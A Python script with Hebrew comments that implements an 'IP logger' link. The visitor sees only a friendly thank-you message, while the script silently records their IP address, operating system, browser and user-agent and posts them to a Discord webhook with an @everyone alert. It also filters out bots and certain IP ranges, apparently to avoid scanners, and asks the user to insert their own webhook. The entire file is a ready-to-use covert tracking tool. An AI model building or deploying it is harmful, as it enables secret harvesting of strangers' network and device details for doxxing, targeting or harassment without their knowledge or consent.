from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import json
import requests
import httpagentparser

# קונפיגורציה
config = {
    "webhook": "https://discord.com/api/webhooks/your_webhook_url",  # החלף ב-Webhook שלך
    "username": "LoggerBot",
    "color": 0x00FFFF,
    "showMessage": True,
    "messageText": "תודה שביקרת בקישור שלנו!",
    "linkAlerts": True,
    "antiBot": True
}

blacklisted_ips = ("27", "104", "143", "164")

# פונקציה לבדיקה אם זה בוט
def is_bot(ip, user_agent):
    if ip.startswith(("34", "35")) or "bot" in user_agent.lower():
        return True
    return False

# פונקציה לשליחת לוג לדיסקורד
def send_log_to_discord(data):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(config["webhook"], headers=headers, data=json.dumps(data))
    return response.status_code

# פונקציית יצירת דוח
def create_report(ip, user_agent, endpoint="/image"):
    if any(ip.startswith(bad) for bad in blacklisted_ips):
        return

    if is_bot(ip, user_agent) and config["antiBot"]:
        return

    os, browser = httpagentparser.simple_detect(user_agent)

    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "IP Logged",
            "color": config["color"],
            "description": f"""
**Endpoint:** {endpoint}

**IP Info:**
> **IP:** {ip}
> **OS:** {os}
> **Browser:** {browser}
> **User-Agent:** {user_agent}
            """
        }]
    }

    send_log_to_discord(embed)

# מחלקת הטיפול בבקשות
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')

        create_report(ip, user_agent, parsed_path.path)

        if config["showMessage"]:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(config["messageText"].encode())
        else:
            self.send_response(204)
            self.end_headers()
